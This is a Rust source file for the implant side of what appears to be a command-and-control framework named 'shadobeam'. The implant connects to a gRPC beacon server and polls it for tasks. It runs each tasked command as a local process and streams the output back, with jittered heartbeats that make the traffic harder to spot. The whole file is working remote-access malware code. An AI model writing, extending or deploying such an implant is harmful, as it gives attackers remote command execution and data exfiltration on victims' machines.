use anyhow::{anyhow, Result};
use rand::Rng;
use uuid::Uuid;

use shadobeam_proto::{
    tasks::{
        beacon_service_client::BeaconServiceClient, ConnectionRequest, OutputRequest, PollRequest,
    },
    OutputResult, Task,
};

use tokio::io::BufReader;
use tokio::process::Command;
use tokio::{
    io::{AsyncBufReadExt, Lines},
    process::ChildStdout,
};
use tonic::transport::Channel;

pub struct Implant {
    client: BeaconServiceClient<Channel>,
    uuid: Uuid,
    heartbeat: u32,
}

impl Implant {
    pub async fn connect(url: &'static str) -> Result<Self> {
        let mut client = BeaconServiceClient::connect(url).await?;
        let response = client
            .connection(tonic::Request::new(ConnectionRequest {}))
            .await?
            .into_inner();
        println!("Connect: RESPONSE={:?}", response);

        Ok(Self {
            client,
            uuid: response.uuid.ok_or(anyhow!("No uuid in request"))?.into(),
            heartbeat: response.heartbeat,
        })
    }

    pub async fn poll(&mut self) -> Result<Option<Task>> {
        let response = self
            .client
            .poll(tonic::Request::new(PollRequest {
                uuid: Some(self.uuid.into()),
            }))
            .await?
            .into_inner();

        Ok(response.task.map(|t| t.into()))
    }

    pub async fn cmd(&mut self, task: Task) -> Result<()> {
        let task_uuid = task.uuid;
        let stream = async_stream::stream! {
            match cmd_reader(task) {
                Ok(mut lines) => {
                    while let Some(line) = lines.next_line().await.unwrap() {
                        yield OutputRequest {
                            task_uuid: Some(task_uuid.into()),
                            output: Some(OutputResult::Ok(line).into()),
                        }
                    }
                },
                Err(e) => {
                    yield OutputRequest {
                        task_uuid: Some(task_uuid.into()),
                        output: Some(OutputResult::Err(e.to_string()).into()),
                    }
                },
            }
        };
        let _response = self
            .client
            .output(tonic::Request::new(stream))
            .await?
            .into_inner();

        Ok(())
    }

    pub fn jitter(&self) -> u64 {
        let offset = self.heartbeat as f32 / 100f32;
        rand::thread_rng()
            .gen_range(self.heartbeat as f32 - offset..=self.heartbeat as f32 + offset)
            as u64
    }
}
fn cmd_reader(task: Task) -> Result<Lines<BufReader<ChildStdout>>> {
    let mut cmd = Command::new(task.code.0);
    if let Some(args) = task.code.1 {
        cmd.args(args);
    }
    let mut output = cmd.stdout(std::process::Stdio::piped()).spawn()?;
    Ok(BufReader::new(
        output
            .stdout
            .take()
            .ok_or(anyhow!("Could not take stdout"))?,
    )
    .lines())
}
